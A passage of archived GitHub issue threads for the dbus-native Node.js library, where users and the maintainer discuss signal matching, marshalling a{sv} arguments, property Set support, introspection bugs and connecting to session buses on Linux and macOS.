      <Body>@sidorares I put another 5-6h of work into it. Still not getting anywhere. I wonder if you tested the script on your side? If it worked there, is there anything permissions-wise that could be interfering?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>so my example is definitely not enough. In order to receive signals client must send  AddMatch message first&#13;
&#13;
try this to see listen for all events:&#13;
```js&#13;
var dbus = require('dbus-native');&#13;
var bus = dbus.sessionBus();&#13;
bus.connection.on('message', console.log);&#13;
bus.addMatch("type='signal'");&#13;
bus.addMatch("type='method_call'");&#13;
bus.addMatch("type='method_return'");&#13;
bus.connection.on('message', function(msg) {&#13;
  console.log(msg);&#13;
});&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>fastworks</Owner>
      <Body>Thanks, the addMatch part really made a difference!&#13;
&#13;
Is there anything documented on how to manage the msg object?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Message is plain object, to better understand semantics of what's there best start is dbus spec: https://dbus.freedesktop.org/doc/dbus-specification.html#message-protocol-messages&#13;
&#13;
Also if you want to continue with "low level" approach (not via automatic introspection) section on match rules also useful: https://dbus.freedesktop.org/doc/dbus-specification.html#message-bus-routing-match-rules</Body>
    </Comment>
    <Comment>
      <Owner>chris-ritsen</Owner>
      <Body>I didn't know where to find the session bus address at first.  This worked for me on Arch linux:&#13;
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus node index.js</Body>
    </Comment>
  </Issue_406>
  <Issue_407>
    <Repository>dbus-native</Repository>
    <Title>Bluez Issue With org.bluez.GattService and org.bluez.Device1.Connect()</Title>
    <Owner>sidorares</Owner>
    <Body>I have a Mac and a PC running Linux on my PC i am running D-Feet(dbus debugger) and I am using Node JS and Dbus-Native to manipulate Bluez 5.49 on my Linux machine. When I look at the D-Feet screen to see all the methods and interfaces in the org.bluez.Device1 section I see the connect method and in my code everytime I use it I get an error, "Protocol not available". The next issue I get is that I keep trying to find the GattService Interface in D-Feet and it doesn't show it their nor can it be accessed in DBUS-Native. I know this isn't DBUS-Native specific but I thought this would be a viable place to look for help.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>not sure how I can help. Can you show us the code that result in "Protocol not available" error?</Body>
    </Comment>
    <Comment>
      <Owner>UsersDoProgram</Owner>
      <Body>Sure it's a little nasty because I'm just focused right now on experimenting with the api but here it is, &#13;
[finder.js](https://github.com/sidorares/dbus-native/files/1910766/finder.txt).&#13;
</Body>
    </Comment>
  </Issue_407>
  <Issue_408>
    <Repository>dbus-native</Repository>
    <Title>Empty Array as Error Value when using `invoke`</Title>
    <Owner>sidorares</Owner>
    <Body>I don't have a reproducible example at this moment, but what would cause this value to be an array, or an empty one?&#13;
&#13;
```js&#13;
bus.invoke({&#13;
  // ... args&#13;
}, function (e, result) {&#13;
  // usually e is either `null` or some error, in my case it's the empty array `[]`&#13;
});&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>athanclark</Owner>
      <Body>However, to be clear, `result === undefined` when `e === []` as well, so there must be an error going on under the hood.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>code that calls your callback is here: https://github.com/sidorares/node-dbus/blob/d9a8176dea9d02c50b75a46c0cee8bf45e92da86/lib/bus.js#L109&#13;
&#13;
can you dump what's in the message? Depending on message `type`, the callback is supposed to be called as `(null, ...message.body)` if it's method return and `(...messageBody)` if it's 'error'&#13;
&#13;
I guess correct way would be do do something like this for error:&#13;
&#13;
```js&#13;
const err = new Error();&#13;
err.messageBody = msg.body;&#13;
handler(err);&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>athanclark</Owner>
      <Body>Do you mean the return message? This is what I received:&#13;
&#13;
```&#13;
{ serial: 3,&#13;
  signature: '',&#13;
  errorName: 'org.freedesktop.DBus.Error.InvalidParameters',&#13;
  replySerial: 2,&#13;
  destination: ':1.309',&#13;
  sender: ':1.311',&#13;
  type: 3,&#13;
  flags: 0 }&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>athanclark</Owner>
      <Body>The weird part is I know for sure that the method I'm calling has a `String -&gt; String` type signature - I can see it with d-feet. I'm trying to find the line where I can inject some logging for the messages I'm sending, if you can point me in the direction :x</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Actually what you get is kind of expected, it's just error message body is empty&#13;
Probably more important for your logic is error name returned:&#13;
&#13;
```js&#13;
bus.invoke({&#13;
  // ... args&#13;
}, function (e, result) {&#13;
  if (e !== null) {&#13;
    console.log(this.message.errorName)&#13;
  }&#13;
});&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'll keep this issue open to track api change: in case of error instance of `Error()` will be returned with message set to `msg.errorName`</Body>
    </Comment>
    <Comment>
      <Owner>athanclark</Owner>
      <Body>yeah I think you're right, this makes a ton of sense. I'll close this now that we know where the issue is. Thank you for your help!!</Body>
    </Comment>
  </Issue_408>
  <Issue_409>
    <Repository>dbus-native</Repository>
    <Title>dbus2js crash when inspect dnsmasq</Title>
    <Owner>sidorares</Owner>
    <Body>I tried to introspect dnsmasq, looks like a missing sanity check&#13;
&#13;
```&#13;
node_modules/.bin/dbus2js --bus system --service uk.org.thekelleys.dnsmasq --path /&#13;
ifaces0 undefined&#13;
/opt/node_modules/dbus-native/node_modules/xml2js/lib/xml2js.js:216&#13;
          throw ex;&#13;
          ^&#13;
&#13;
TypeError: Cannot read property 'length' of undefined&#13;
    at /opt/node_modules/dbus-native/bin/dbus2js.js:59:31&#13;
    at Parser.&lt;anonymous&gt; (/opt/node_modules/dbus-native/node_modules/xml2js/lib/xml2js.js:199:18)&#13;
    at emitOne (events.js:96:13)&#13;
    at Parser.emit (events.js:188:7)&#13;
```&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks! I don't really know when I have some free time to investigate, can you try to have a look at the problem?</Body>
    </Comment>
  </Issue_409>
  <Issue_410>
    <Repository>dbus-native</Repository>
    <Title>Fixed problems with introspection, the path names and structure were not</Title>
    <Owner>sidorares</Owner>
    <Body>correct and didn't allow for proper recursion. Now the path names for all&#13;
child nodes have names relative to the path specified in the query, and are&#13;
provided with a null node placeholder entry so they appear in the xml, and&#13;
the caller can then recursively scan as desired.&#13;
&#13;
The code could probably be made more efficient with fewer checks for&#13;
exceptions.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Hi @dashxdr ! I _think_ I understand the issue, but could you provide step-by-step example where old code would fail?</Body>
    </Comment>
    <Comment>
      <Owner>dashxdr</Owner>
      <Body>Here is an example, it mimics the ofono dbus interface (just a little). It can be placed in the node-dbus/test directory.&#13;
&#13;
&#13;
```&#13;
// ****************** START&#13;
#!/usr/bin/env node&#13;
"use strict";&#13;
&#13;
var dbus = require('../../node-dbus');&#13;
var bus = dbus.systemBus();&#13;
&#13;
&#13;
var ManagerIface = {&#13;
 name: 'org.ofono.Manager',&#13;
 methods: {&#13;
  GetModems: ['', 'a(oa{sv})', [], ['modems']], &#13;
 },&#13;
 signals: {&#13;
  ModemAdded: ['oa{sv}', ['path'], ['properties']],&#13;
  ModemRemoved: ['o', ['path']],&#13;
 },&#13;
};&#13;
&#13;
var Manager = {&#13;
 GetModems: function()&#13;
 {&#13;
  console.log('Manager.GetModems');&#13;
&#13;
  return [[&#13;
   '/sim5320_0',&#13;
   [&#13;
    ['Online', ['b', true]],&#13;
   ]&#13;
  ]];&#13;
 },&#13;
};&#13;
&#13;
bus.requestName('org.ofono', 0x4, function(e, retCode) {&#13;
 if(e) console.log('error with requestName');&#13;
 else {&#13;
  console.log('requestName worked, retCode = ' + retCode);&#13;
  bus.exportInterface(Manager, '/', ManagerIface);&#13;
&#13;
 }&#13;
});&#13;
//********************* END&#13;
&#13;
```&#13;
When you run it you can test functionality with this:&#13;
  dbus-send --system --dest=org.ofono --print-reply / org.ofono.Manager.GetModems&#13;
And it should output this:&#13;
```&#13;
   array [&#13;
      struct {&#13;
         object path "/sim5320_0"&#13;
         array [&#13;
            dict entry(&#13;
               string "Online"&#13;
               variant                   boolean true&#13;
            )&#13;
         ]&#13;
      }&#13;
   ]&#13;
&#13;
```&#13;
To verify some instrospection functionality do this first:&#13;
  gdbus introspect --system --dest org.ofono --object-path /&#13;
The output should be this:&#13;
```&#13;
node / {&#13;
  node  {&#13;
  };&#13;
};&#13;
&#13;
```&#13;
NOW to cause the failure, add the --recurse onto the query:&#13;
   gdbus introspect --system --dest org.ofono --object-path / --recurse&#13;
and voila:&#13;
```&#13;
node / {&#13;
  node / {&#13;
    node / {&#13;
      node / {&#13;
        node / {&#13;
          node / {&#13;
            node / {&#13;
              node / {&#13;
                node / {&#13;
                  node / {&#13;
                    node / {&#13;
                      node / {&#13;
&#13;
```&#13;
&#13;
... etc&#13;
&#13;
With my version we get this for both queries, which is what we want:&#13;
&#13;
&#13;
```&#13;
node / {&#13;
  interface org.ofono.Manager {&#13;
    methods:&#13;
      GetModems(out a(oa{sv}) modems);&#13;
    signals:&#13;
      ModemAdded(o path,&#13;
                 a{sv} properties);&#13;
      ModemRemoved(o path);&#13;
    properties:&#13;
  };&#13;
  interface org.freedesktop.DBus.Properties {&#13;
    methods:&#13;
      Get(in  s interface_name,&#13;
          in  s property_name,&#13;
          out v value);&#13;
      GetAll(in  s interface_name,&#13;
             out a{sv} properties);&#13;
      Set(in  s interface_name,&#13;
          in  s property_name,&#13;
          in  v value);&#13;
    signals:&#13;
      PropertiesChanged(s interface_name,&#13;
                        a{sv} changed_properties,&#13;
                        as invalidated_properties);&#13;
    properties:&#13;
  };&#13;
  interface org.freedesktop.DBus.Introspectable {&#13;
    methods:&#13;
      Introspect(out s xml_data);&#13;
    signals:&#13;
    properties:&#13;
  };&#13;
  interface org.freedesktop.DBus.Peer {&#13;
    methods:&#13;
      Ping();&#13;
      GetMachineId(out s machine_uuid);&#13;
    signals:&#13;
    properties:&#13;
  };&#13;
};&#13;
&#13;
```&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>dashxdr</Owner>
      <Body>One other note, you need to make sure your permissions are set to allow queries on the system dbus, I'm a little hazy on the details. Here is my /etc/dbus-1/system.d/ofono.conf file if it helps...&#13;
&#13;
```&#13;
&lt;!-- This configuration file specifies the required security policies&#13;
     for oFono core daemon to work. --&gt;&#13;
&#13;
&lt;!DOCTYPE busconfig PUBLIC "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"&#13;
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd"&gt;&#13;
&lt;busconfig&gt;&#13;
&#13;
  &lt;!-- ../system.conf have denied everything, so we just punch some holes --&gt;&#13;
&#13;
  &lt;policy user="root"&gt;&#13;
    &lt;allow own="org.ofono"/&gt;&#13;
    &lt;allow send_destination="org.ofono"/&gt;&#13;
    &lt;allow send_interface="org.ofono.SimToolkitAgent"/&gt;&#13;
    &lt;allow send_interface="org.ofono.PushNotificationAgent"/&gt;&#13;
    &lt;allow send_interface="org.ofono.SmartMessagingAgent"/&gt;&#13;
    &lt;allow send_interface="org.ofono.PositioningRequestAgent"/&gt;&#13;
    &lt;allow send_interface="org.ofono.HandsfreeAudioAgent"/&gt;&#13;
  &lt;/policy&gt;&#13;
&#13;
  &lt;policy at_console="true"&gt;&#13;
    &lt;allow send_destination="org.ofono"/&gt;&#13;
  &lt;/policy&gt;&#13;
&#13;
  &lt;policy context="default"&gt;&#13;
    &lt;deny send_destination="org.ofono"/&gt;&#13;
  &lt;/policy&gt;&#13;
&#13;
&lt;/busconfig&gt;&#13;
&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks! I'll try to have a look soon ( there is a huge backlog on this project I never had enough time to action )</Body>
    </Comment>
  </Issue_410>
  <Issue_411>
    <Repository>dbus-native</Repository>
    <Title>How do I call a method with signature a{sv}</Title>
    <Owner>sidorares</Owner>
    <Body>I have a separate application which exposes a DBus interface with a few methods I would like to call via node-dbus.

One of the methods, func, takes an argument  with the DBus signature "a{sv}", and I'm not sure how node-dbus expects such a parameter to be passed. My naive expectation was that I would simply pass a JavaScript object and it would be serialized correctly:

myinterface.func({a: "foo", b: "bar", c: 42}, function(err, result) {...})

and while this does actually call the method, the other application receives an empty array as an argument, so clearly it's not as simple as that.

So what do I do instead?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>We really want to allow `{a: "foo", b: "bar", c: 42}` to be used for "a{sv}" but at the moment it's quite verbose, you have to go through each step in the tree: top level structure, array, string, variant.

``` js
[ // top level struct is js array
  [ // array is js array
    ['a', ['s', 'foo']], // dict_entry is 2 element array - key,value
    ['b', ['s', 'bar']], //   variant is [signature, data]
    ['c', ['n', 42]]
  ]
]
```
</Body>
    </Comment>
    <Comment>
      <Owner>nschoe</Owner>
      <Body>As @sidorares said, we are currently working on making it possible to return "real" Javascript object, but this is not yet possible.
I sugges you take a look at [this file](https://github.com/sidorares/node-dbus/blob/master/examples/return-types.js) which is an example file I pushed recently showing how to return some of the most commons types.
Ironically I've just noticed that I have forgotten the variant type! But at least this will give you and idea of how to return an array, a struct, a dict, etc.
When you understand this, just think, as @sidorares  suggested, that `(variant) = [signature, type]`. So if your variant is actually an int32, it should be represented as `['i', 2392]`. That's all :-)
</Body>
    </Comment>
    <Comment>
      <Owner>convintel</Owner>
      <Body>Has the "return a real javascript object" feature been added yet? Thanks!</Body>
    </Comment>
  </Issue_411>
  <Issue_412>
    <Repository>dbus-native</Repository>
    <Title>Can't Set property</Title>
    <Owner>sidorares</Owner>
    <Body>It's currently not possible to set a DBus property to a service.

Let's consider this minimalistic service:

``` Javascript
let ifaceDesc = {
    name: 'fr.diag',
    properties: {
        StringProp: 's'
    }
}

let iface = {
    StringProp: 'Hello, world!'
}
```

When it runs, we can introspect it with `gdbus` and see that it has indeed a property `StringProp` with type `s (string)`:

``` Bash
gdbus introspect -e -d fr.diag -o /fr/Diag

node /fr/Diag {
  interface fr.diag {
    methods:
    signals:
    properties:
      readwrite s StringProp = 'Hello, world!';
  };
  interface org.freedesktop.DBus.Properties {
    methods:
      Get(in  s interface_name,
          in  s property_name,
          out v value);
      GetAll(in  s interface_name,
             out a{sv} properties);
      Set(in  s interface_name,
          in  s property_name,
          in  v value);
    signals:
      PropertiesChanged(s interface_name,
                        a{sv} changed_properties,
                        as invalidated_properties);
    properties:
  };
  interface org.freedesktop.DBus.Introspectable {
    methods:
      Introspect(out s xml_data);
    signals:
    properties:
  };
  interface org.freedesktop.DBus.Peer {
    methods:
      Ping();
      GetMachineId(out s machine_uuid);
    signals:
    properties:
  };
};
```

We can then use `gdbus` to get the value of the property:

``` Bash
gdbus call -e -d fr.diag -o /fr/Diag -m org.freedesktop.DBus.Properties.Get 'fr.diag' 'StringProp'          

(&lt;'Hello, world!'&gt;,)
```

So far, so good.

Now, trying to **set** the property:

``` Bash

gdbus call -e -d fr.diag -o /fr/Diag -m org.freedesktop.DBus.Properties.Set 'fr.diag' 'StringProp' "&lt;'Bye, guys!'&gt;"
()
```

And when trying to get it again (either directly asking `Get` with `gdbus` or trying to introspect):

``` Bash
gdbus call -e -d fr.diag -o /fr/Diag -m org.freedesktop.DBus.Properties.Get 'fr.diag' 'StringProp'                                
Error: GDBus.Error:org.freedesktop.DBus.Error.NoReply: Message recipient disconnected from message bus without replying
(According to introspection data, you need to pass 'ss')
```

And in the terminal where I had my service run, I've got:

``` Bash
Error: Expected string or buffer argument, got 1234 of type 's'
    at writeSimple (~/node_modules/dbus-native/lib/marshall.js:106:13)
```

---

Grepping on this `1234`, I've found that **Set** [is not yet implemented](https://github.com/sidorares/node-dbus/blob/master/lib/stdifaces.js#L118)

So we should fix this :-)
</Body>
    <State>open</State>
    <Comment>
      <Owner>nschoe</Owner>
      <Body>I'm working on it, I have implemented setting single types for now (so every type that is not a container) [here](https://github.com/sidorares/node-dbus/blob/129-SettingProperties/lib/stdifaces.js#L142-L160).

Sorry for the console.log which slipped, it will be put inside a `if (DEBUG)` in next commits.

Currently working on implementing on setting complex values.
</Body>
    </Comment>
    <Comment>
      <Owner>nschoe</Owner>
      <Body>I've pushed e6958f535db63669b346b4f8e8119c845655861d which should close this issue.
Test it then keep me up. I have included two example files `server-properties.js` and `client-properties.js` to demonstrate how this is used.
</Body>
    </Comment>
    <Comment>
      <Owner>nschoe</Owner>
      <Body>@sidorares did you have a chance to test it?
</Body>
    </Comment>
  </Issue_412>
  <Issue_413>
    <Repository>dbus-native</Repository>
    <Title>[Question] - Shouldn't the `serial` be incremented in `bus.sendSignal()`?</Title>
    <Owner>sidorares</Owner>
    <Body>I was scouting through the code and found [this](https://github.com/sidorares/node-dbus/blob/master/lib/bus.js#L59): in the functoin `bus.sendSignal()`, the `signalMsg` gets a field `serial`, like all other DBus messages, but usually, as seen [here](https://github.com/sidorares/node-dbus/blob/master/lib/bus.js#L25-L26) the serial is incremented.

So shouldn't it be incremented here? I do see that for the signal, as it doesn't expect a return, it doesn't store a callback handler with the serial being the key, but I'm wondering if this can still cause some problems with the daemon: suppose I send a DBus signal with serial 1089, the DBus dameon sees an incoming message to transmit to interested peers, with `serial = 1089`, what if I then send another message (not a signal), maybe a method call, it will have `serial = 1089` too, is it a problem?

---

As a side question: is it mandatory that serials start at 1 and increment? Can they be random? In which case, maybe we could use a library like `shortid` or equivalent that generates a random serial each time, this ways we would not have to think about incrementing it.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; So shouldn't it be incremented here? 

Need to double check, probably yes. Serials are important when you receive response and signals usually don't get reply 

&gt; As a side question: is it mandatory that serials start at 1 and increment? Can they be random?

Yes, I think they can be arbitrary. To me it's easier to increment rather than worry about random numbers collisions ( also easier to debug - which one went out before which )
</Body>
    </Comment>
  </Issue_413>
  <Issue_414>
    <Repository>dbus-native</Repository>
    <Title>Callback never received</Title>
    <Owner>sidorares</Owner>
    <Body>I was trying to figure out why a certain part of my code seemingly never executed but it seems that a callback from the node-dbus API is never called.

The code in question: (bus.js : 289)

``` js
this.getInterface = function(path, objname, name, callback) {
       return this.getObject(path, objname, function(err, obj) {
           if (err) return callback(err);
           callback(null, obj.as(name));
       });
    };
```

I have tried debugging the node-dbus library use the node dbug command but have been unable to find the cause. (the execution seemingly steps over the callback and never executes.)

For reference my code:

``` js
function getWPA_Supplicant() {
    return new Promise(function(resolve, reject) {
        wpai = wpas.getInterface('/fi/w1/wpa_supplicant1'
            , 'fi.w1.wpa_supplicant1', function (err, iface) {
                //console.log(err, iface);
                if (err) {
                    return reject(new Error(err));
                }

                iface.on('PropertiesChanged', function(dict) {
                    console.log('interface properties have changed!');
                    console.log(dict + "\n");
                });

                iface.on('InterfaceAdded', function(path, dict) {
                    console.log('interface has been added!'+ "\n");
                });

                iface.on('InterfaceRemoved', function(path) {
                    console.log('interface has been removed!');
                    console.log(path + "\n");
                });
                //fulfill the promise by returning the wireless interface
                return resolve(iface);
            });
    });
}

//We promise to get the wireless interface that already exists
function getWirelessInterface(){
    return new Promise(function(resolve, reject) {
        console.log("entering promise");
        console.log(wpas);
        debugger;
        wlif = wpas.getInterface('fi/wi/wpa_supplicant1/Interfaces/1'
            , 'fi.w1.wpa_supplicant1.Interface', "testingInterface", function (err, iface2) {
                console.log(err, iface2);
            //TODO this never resolves
                debugger;
            if (err) {
                console.log("rejected error!");
                return reject(new Error(err));
            }
            console.log("after err step");
            iface2.on('ScanDone', function (result) {
                console.log("Scan is Done..");
                console.log(result);
            });

            iface2.on('NetworkAdded', function (path, properties) {
                console.log("NetworkAdded");
                console.log(path, properties);
            });

            iface2.on('NetworkRemoved', function (path) {
                console.log("NetworkRemoved");
                console.log(path);
            });

            iface2.on('PropertiesChanged', function (properties) {
                console.log("PropertiesChanged");
                console.log(properties);
            });
            console.log("we enter the resolve step");
            return resolve(iface2);
        });
    });
}
```

``` js
function setup(){

    if (fs.existsSync('/run/wpa_supplicant/wlan0')) {
        //clean the run directory of any old interface instances
        fs.unlinkSync('/run/wpa_supplicant/wlan0', (err) =&gt; {
            if (err) {
                throw new Error(err);
            }
            console.log("deleted /run/wpa_supplicant/wlan0");
    });
    }


    getWPA_Supplicant().then(function(iface) {
        console.log("returning connect");
        return connect(iface);

    }).then(function() {
        console.log("returning getwirelessInterface");
        var value = getWirelessInterface();
        console.log(value);
        return value;

    }).then(function () {
        debugger;
        console.log("after the getInterface");

    }).catch(console.error.bind(console));

function connect(iface2) {
    console.log("connect");
    return new Promise (function(resolve, reject) {
        var retface = iface2.CreateInterface([
            ['Ifname',
                ['s', 'wlan0']
            ],
            ['Driver',
                ['s', 'nl80211']
            ],
            ['ConfigFile',
                ['s', '/etc/wpa_supplicant/wpa_supplicant.conf']
            ]
        ], function (err, iface3){
            console.log(err, iface3);
            if (err) {
                return reject(new Error(err));
            }
            return resolve(retface);
        });
    });
}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>muka</Owner>
      <Body>This happens to me too. The `Introspect` request never get completed
</Body>
    </Comment>
    <Comment>
      <Owner>YurySolovyov</Owner>
      <Body>might be related: #117 
</Body>
    </Comment>
  </Issue_414>
  <Issue_415>
    <Repository>dbus-native</Repository>
    <Title>Connecting to session bus requests password</Title>
    <Owner>sidorares</Owner>
    <Body>I'm not sure exactly what's going on. I try to connect using the following code

```
console.log("Connecting to sessionBus 'unix:path=" + process.env.DBUS_LAUNCHD_SESSION_BUS_SOCKET.toString() + "'");
bus = dbus.sessionBus({ busAddress : "unix:path=" + process.env.DBUS_LAUNCHD_SESSION_BUS_SOCKET.toString() });
```

and it outputs

```
Connecting to sessionBus 'unix:path=/private/tmp/com.apple.launchd.y24Av06XkO/unix_domain_listener'
Password:PodtiqueUI listening on http://localhost:8080
events.js:85
      throw er; // Unhandled 'error' event
            ^
Error: connect ECONNREFUSED
    at exports._errnoException (util.js:746:11)
    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1010:19)
```

You can see it asking for the root password there. If instead I launch node with sudo, I get:

```
$ sudo node app.js 
Password:
/Users/rmann/Projects/Podtique/podtique/ui/node_modules/dbus-native/index.js:25
  if (!busAddress) throw new Error('unknown bus address');
                         ^
Error: unknown bus address
    at createStream (/Users/rmann/Projects/Podtique/podtique/ui/node_modules/dbus-native/index.js:25:26)
    at createConnection (/Users/rmann/Projects/Podtique/podtique/ui/node_modules/dbus-native/index.js:70:30)
    at Function.module.exports.createClient (/Users/rmann/Projects/Podtique/podtique/ui/node_modules/dbus-native/index.js:130:20)
    at Function.module.exports.sessionBus (/Users/rmann/Projects/Podtique/podtique/ui/node_modules/dbus-native/index.js:141:25)
    at Object.&lt;anonymous&gt; (/Users/rmann/Projects/Podtique/podtique/ui/app.js:28:13)
    at Module._compile (module.js:460:26)
    at Object.Module._extensions..js (module.js:478:10)
    at Module.load (module.js:355:32)
    at Function.Module._load (module.js:310:12)
    at Function.Module.runMain (module.js:501:10)
```

I'd rather not launch as root, and the OS X launchd dbus-daemon process is loaded not as root.

What's weird is this stuff used to work, but I can't figure out what's changed to break it.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; You can see it asking for the root password there

I don't see it

&gt; If instead I launch node with sudo

launchd probably does not set DBUS_LAUNCHD_SESSION_BUS_SOCKET for root
</Body>
    </Comment>
    <Comment>
      <Owner>JetForMe</Owner>
      <Body>The second line of the output in the non-root launch case is

```
Password:PodtiqueUI listening on http://localhost:8080
```

The connection is refused. I'm not sure if that's because of how launchd is opening the socket, or what, but it's owned by my user and has a+rw perms.

The code now is:

```
console.log("Connecting to sessionBus 'unix:path=" + process.env.DBUS_LAUNCHD_SESSION_BUS_SOCKET.toString() + "'");
bus = dbus.sessionBus({ socket : process.env.DBUS_LAUNCHD_SESSION_BUS_SOCKET });
```

and the output is

```
$ node app.js 
Connecting to sessionBus 'unix:path=/private/tmp/com.apple.launchd.y24Av06XkO/unix_domain_listener'
Password:PodtiqueUI listening on http://localhost:8080
events.js:85
      throw er; // Unhandled 'error' event
            ^
Error: connect ECONNREFUSED
    at exports._errnoException (util.js:746:11)
    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1010:19)
```

Again, you can see something is asking for a password, but an exception is thrown and node exits before I can type it. Also, at this point, my terminal is kinda hosed (no local echo).
</Body>
    </Comment>
    <Comment>
      <Owner>JetForMe</Owner>
      <Body>I realized I had a really confused node installation, tried to clean it up. Now I'm on node 4.2.1. I still have the same basic problem:

```
$ node app.js 
Connecting to sessionBus 'unix:path=/private/tmp/com.apple.launchd.y24Av06XkO/unix_domain_listener'
Password:PodtiqueUI listening on http://localhost:8080
events.js:141
      throw er; // Unhandled 'error' event
      ^

Error: connect ECONNREFUSED /private/tmp/com.apple.launchd.y24Av06XkO/unix_domain_listener
    at Object.exports._errnoException (util.js:874:11)
    at exports._exceptionWithHostPort (util.js:897:20)
    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1063:14)
```
</Body>
    </Comment>
  </Issue_415>
  <Issue_416>
    <Repository>dbus-native</Repository>
    <Title>Please support "launchd:" address family type</Title>
    <Owner>sidorares</Owner>
    <Body>DBus 1.10 supports `launchd` addresses directly, according to the [spec](http://dbus.freedesktop.org/doc/dbus-specification.html#transports-launchd).

They take the form `launchd:env=SOME_ENV_VAR`. The examples I've found on line result in

```
launchd:env=DBUS_LAUNCHD_SESSION_BUS_SOCKET
```

I'm currently connecting to that bus with

```
dbus.sessionBus({ busAddress : "unix:path=" + process.env.DBUS_LAUNCHD_SESSION_BUS_SOCKET.toString() });
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>in addition to encoding values and passing vie busAddress you can use `host`, `port` and `socket` directly:

`dbus.sessionBus({ soket: process.env.DBUS_LAUNCHD_SESSION_BUS_SOCKET } )`
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>but I'm keen to support all [transports](http://dbus.freedesktop.org/doc/dbus-specification.html#transports) in `busAddress` string
</Body>
    </Comment>
    <Comment>
      <Owner>JetForMe</Owner>
      <Body>Oh yeah, that's tidy, too. Admittedly, the launchd: support is a bit minor. More important is that I can't get it to connect using socket or busAddress (see #96)
</Body>
    </Comment>
  </Issue_416>
  <Issue_417>
    <Repository>dbus-native</Repository>
    <Title>Readme Low level messaging: bus connection example error</Title>
    <Owner>sidorares</Owner>
    <Body>The docs talk about "dbus.createClient(options)", but the example shows "dbus.createConnection()."
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>oops. Do you know which one is correct ( don't have time to read through code right now )
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Any improvements to documentations are very much welcome, if you find time adding something please submit PR 
</Body>
    </Comment>
    <Comment>
      <Owner>JetForMe</Owner>
      <Body>Yeah, I don't know which is correct! I'm trying some experiments now. I'm having some issues getting DBus to play nicely in all of a handful of configurations, so I was trying some changes. I think `createConnection()` is right.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>they both are correct, that was probably not a good choice of names

https://github.com/sidorares/node-dbus/blob/master/index.js#L129-L132

'connection' is for low level messaging - `conn.message({...})` and `conn.on('message, ...)'`

'client' handles RPC-style calls by remembering association from serial/replySerial to callback
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>and you can always access connection from a client:

``` js
var bus = require('dbus-native').systemBus(); // "client"
bus.connection.message({ body: 'hello', signature: 's'}); 
```
</Body>
    </Comment>
    <Comment>
      <Owner>JetForMe</Owner>
      <Body>Heh. I find this all very confusing. I'm using DBus to communicate between a C++ app and my node.js app, on both OS X and Debian. During development, I want to be able to launch one or the other, or both, in any order, and I want them to quickly connect or abandon a connection attempt and connect later. I wish I could do this without dbus-daemon running at all, but that doesn't seem to be the case.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>this module allows to communicate directly - you could pretend that you are daemon and point C++ app to your node app by setting DBUS_SESSION_BUS_ADDRESS
</Body>
    </Comment>
    <Comment>
      <Owner>JetForMe</Owner>
      <Body>But it seems I have to create a socket somewhere.
</Body>
    </Comment>
  </Issue_417>
  <Issue_418>
    <Repository>dbus-native</Repository>
    <Title>How to make a readonly property in service?</Title>
    <Owner>sidorares</Owner>
    <Body>I am trying to implement the [MPRIS](http://specifications.freedesktop.org/mpris-spec/latest/) interface, and some of the properties have to be marked as readonly. How can I do this?

In [this](https://github.com/emersion/mpris-service/blob/master/index.js#L208) example, a property is defined as readonly by whether it has just a getter, or a getter and setter function, but it is using a different dbus library (Shouqun's), which requires libdbus. Is there a similar method in your library?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Hi! The code that handles Get/Set property is here - https://github.com/sidorares/node-dbus/blob/master/lib/stdifaces.js#L110-L120 ( note that the code here is not very finished )

I think what you need is ability to report properties in introspection data. Currently it is generated automatically and the code is here: https://github.com/sidorares/node-dbus/blob/master/lib/stdifaces.js#L152-L192

Note that properties are always readwrite atm. What do you think would be the best way to express this when you describe object?
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>in https://github.com/sidorares/node-dbus/blob/master/examples/service/server2.js#L26
Could be 

``` js
 var exampleIface = {
    name: 'com.example.service',
    methods: {
        doStuff: ['s', 's'],
        timesTwo: ['d', 'd'],
        respondWithDouble: ['s', 'd']
    },
    signals: {
        testsignal: [ 'us', 'name1', 'name2' ]
    },
    properties: {
       TestProperty: 'y',  // default: readwrire
       ReadProperty: [ 's', 'read' ], // if array, second argument is access as per http://dbus.freedesktop.org/doc/dbus-specification.html#introspection-format
       WriteProperty: [ 's', 'write' ] // first parameter is property signature
    }
};
```

wdyt?
</Body>
    </Comment>
    <Comment>
      <Owner>WhiteAbeLincoln</Owner>
